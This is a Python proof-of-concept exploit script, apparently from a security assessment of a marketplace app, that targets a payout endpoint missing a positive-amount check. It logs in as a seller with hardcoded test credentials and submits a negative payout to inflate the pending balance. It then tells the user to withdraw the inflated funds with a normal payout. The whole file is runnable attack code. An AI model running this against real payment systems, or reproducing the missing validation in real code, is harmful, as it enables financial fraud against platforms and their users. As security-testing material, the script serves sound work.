#!/usr/bin/env python3
"""
BL-2 — Negative Payout → Pending Balance Inflation
Endpoint: POST /api/payouts
Auth    : Seller account

The gt=0 validator was removed from PayoutRequest.amount.
process_payout_deduction checks: pending_balance < amount
With amount = -X: pending_balance < -X  →  always False  →  passes.
Then: pending_balance -= (-X)  →  pending_balance += X

A seller can inflate their pending_balance to any value by requesting
a payout with a negative amount, then withdraw it via a normal payout.

Usage
-----
    python poc_011_negative_payout_balance_inflation.py
    python poc_011_negative_payout_balance_inflation.py --amount -1000
"""

import argparse
import sys
import requests

SELLER_EMAIL    = "alice@mercury.com"
SELLER_PASSWORD = "Seller123!"


def banner():
    print("=" * 60)
    print("  BL-2 — Negative Payout → Pending Balance Inflation")
    print("  Endpoint: POST /api/payouts")
    print("=" * 60)


def login(base_url, email, password):
    resp = requests.post(f"{base_url}/api/auth/login",
                         json={"email": email, "password": password}, timeout=10)
    resp.raise_for_status()
    token = resp.json().get("access_token")
    if not token:
        print("[-] Login failed"); sys.exit(1)
    return token


def get_wallet(base_url, token):
    resp = requests.get(f"{base_url}/api/wallet",
                        headers={"Authorization": f"Bearer {token}"}, timeout=10)
    resp.raise_for_status()
    return resp.json()


def request_payout(base_url, token, amount):
    resp = requests.post(f"{base_url}/api/payouts",
                         headers={"Authorization": f"Bearer {token}"},
                         json={"amount": amount, "method": "bank_transfer"}, timeout=10)
    return resp


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://localhost:8000")
    parser.add_argument("--amount", type=float, default=-500.0,
                        help="Negative amount to inflate pending_balance (default: -500)")
    args = parser.parse_args()

    if args.amount >= 0:
        print("[-] Amount must be negative for this exploit"); sys.exit(1)

    banner()
    token = login(args.url, SELLER_EMAIL, SELLER_PASSWORD)
    print(f"[+] Authenticated as {SELLER_EMAIL}")

    wallet_before = get_wallet(args.url, token)
    print(f"[*] pending_balance before: ${wallet_before['pending_balance']:.2f}")
    print(f"[*] Requesting payout with amount={args.amount} ...")

    resp = request_payout(args.url, token, args.amount)
    if resp.status_code == 201:
        wallet_after = get_wallet(args.url, token)
        gained = wallet_after["pending_balance"] - wallet_before["pending_balance"]
        print(f"[+] Payout accepted!")
        print(f"[+] pending_balance after : ${wallet_after['pending_balance']:.2f}  (gained ${gained:.2f})")
        print(f"[*] Now request a NORMAL positive payout to cash out the inflated balance.")
    else:
        print(f"[-] {resp.status_code}: {resp.json().get('detail')}")

    print("\n[+] Done.")


if __name__ == "__main__":
    main()
